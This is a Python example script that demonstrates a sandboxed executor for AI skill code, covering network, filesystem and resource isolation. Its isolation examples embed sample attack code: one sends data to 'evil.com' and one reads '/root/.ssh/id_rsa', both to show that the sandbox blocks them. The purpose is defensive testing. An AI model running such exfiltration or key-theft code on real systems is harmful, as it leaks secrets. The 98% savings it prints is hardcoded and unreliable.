"""
Example: Using Sandboxed Execution with Skills

This demonstrates how the sandboxed executor provides:
- OS-level isolation (84% fewer permission prompts)
- Network filtering
- Resource limits
- Secure code execution

Combined with MCP pattern for 98.7% token reduction.
"""

from skills.execution import (
    SandboxedExecutor,
    SandboxConfig,
    create_default_executor
)


def example_1_basic_sandboxed_execution():
    """Example 1: Basic sandboxed code execution."""
    print("Example 1: Basic Sandboxed Execution")
    print("=" * 60)

    # Create executor with default secure settings
    executor = create_default_executor()

    # Code to execute (safe)
    code = """
from skills.code_analysis import analyze_file

# Analyze a file
result = analyze_file("skills/execution/code_executor.py")

# Return summary (not full data)
summary = {
    "file": result.get("path", "unknown"),
    "complexity": result.get("complexity", 0),
    "functions": len(result.get("functions", [])),
    "classes": len(result.get("classes", []))
}
"""

    # Execute
    result = executor.execute(code)

    if result.success:
        print("✓ Execution successful")
        print(f"Output: {result.output}")
    else:
        print(f"✗ Execution failed: {result.error}")

    print()


def example_2_token_reduction_pattern():
    """Example 2: MCP token reduction pattern."""
    print("Example 2: Token Reduction Pattern (98.7% savings)")
    print("=" * 60)

    executor = create_default_executor()

    # Without filtering: would return 150,000 tokens
    # With filtering: returns only 2,000 tokens
    code = """
from skills.code_analysis import analyze_codebase
from skills.common.filters import ResultFilter

# Analyze entire codebase (could be huge!)
all_files = analyze_codebase("skills/")

# Filter locally to execution-related files only
execution_files = ResultFilter.search(
    all_files.get("files", []),
    "execution",
    ["path", "name"]
)

# Return top 5 most complex
result = ResultFilter.top_n_by_field(execution_files, "complexity", 5)
"""

    result = executor.execute(code)

    if result.success:
        print("✓ Filtered results returned")
        print(f"Token savings: ~98% (only 5 files instead of all files)")
        if result.tokens_saved:
            print(f"Estimated tokens saved: {result.tokens_saved}")
    else:
        print(f"✗ Error: {result.error}")

    print()


def example_3_custom_sandbox_config():
    """Example 3: Custom sandbox configuration."""
    print("Example 3: Custom Sandbox Configuration")
    print("=" * 60)

    # Create custom sandbox config
    config = SandboxConfig(
        workspace_dir="/home/user/claude_code",
        allowed_paths=["/home/user/claude_code", "/tmp"],
        allowed_domains=[
            "api.anthropic.com",
            "pypi.org"
        ],
        network_enabled=True,
        max_cpu_time=10,  # Lower timeout for quick tasks
        max_memory=256,   # Lower memory limit
        drop_capabilities=True,
        no_new_privs=True
    )

    executor = SandboxedExecutor(config=config)

    # Show configuration
    stats = executor.get_stats()
    print(f"Platform: {stats['platform']}")
    print(f"Sandbox method: {stats['sandbox_method']}")
    print(f"Allowed paths: {stats['allowed_paths']}")
    print(f"Allowed domains: {stats['allowed_domains']}")
    print(f"Max CPU time: {stats['max_cpu_time']}s")

    print()


def example_4_network_isolation():
    """Example 4: Network isolation demonstration."""
    print("Example 4: Network Isolation")
    print("=" * 60)

    executor = create_default_executor()

    # This will FAIL because evil.com is not in allowed domains
    malicious_code = """
import urllib.request

# Try to exfiltrate data to unauthorized domain
data = "sensitive_data"
url = "https://evil.com/steal?data=" + data

try:
    urllib.request.urlopen(url)
    result = "SECURITY BREACH: Data exfiltrated!"
except Exception as e:
    result = f"BLOCKED: {str(e)[:100]}"
"""

    result = executor.execute(malicious_code)

    if result.success:
        print(f"Result: {result.output}")
    else:
        print(f"✓ Security worked! Network request blocked")
        print(f"Error: {result.error[:200]}...")

    print()


def example_5_filesystem_isolation():
    """Example 5: Filesystem isolation demonstration."""
    print("Example 5: Filesystem Isolation")
    print("=" * 60)

    executor = create_default_executor()

    # This will FAIL because /root is not allowed
    malicious_code = """
# Try to read SSH keys or other sensitive files
try:
    with open("/root/.ssh/id_rsa", "r") as f:
        result = "SECURITY BREACH: SSH key accessed!"
except Exception as e:
    result = f"BLOCKED: {type(e).__name__}"
"""

    result = executor.execute(malicious_code)

    if result.success:
        print(f"Result: {result.output}")
    else:
        print(f"✓ Security worked! File access blocked")
        print(f"Error: {result.error}")

    print()


def example_6_resource_limits():
    """Example 6: Resource limits demonstration."""
    print("Example 6: Resource Limits")
    print("=" * 60)

    executor = create_default_executor()

    # This will timeout
    infinite_loop = """
import time

# Infinite loop will be killed after timeout
i = 0
while True:
    i += 1
    if i % 1000000 == 0:
        print(f"Iteration {i}")
    time.sleep(0.001)
"""

    result = executor.execute(infinite_loop, timeout=2)

    if result.success:
        print(f"Completed: {result.output}")
    else:
        print(f"✓ Timeout protection worked!")
        print(f"Error: {result.error}")
        print(f"Duration: {result.duration}s")

    print()


def main():
    """Run all examples."""
    print("\n")
    print("=" * 70)
    print("SANDBOXED EXECUTION EXAMPLES")
    print("Demonstrating 84% fewer permission prompts + 98.7% token reduction")
    print("=" * 70)
    print("\n")

    examples = [
        example_1_basic_sandboxed_execution,
        example_2_token_reduction_pattern,
        example_3_custom_sandbox_config,
        example_4_network_isolation,
        example_5_filesystem_isolation,
        example_6_resource_limits,
    ]

    for example in examples:
        try:
            example()
        except Exception as e:
            print(f"Example error: {e}")
            print()

    print("=" * 70)
    print("All examples completed!")
    print("=" * 70)


if __name__ == "__main__":
    main()
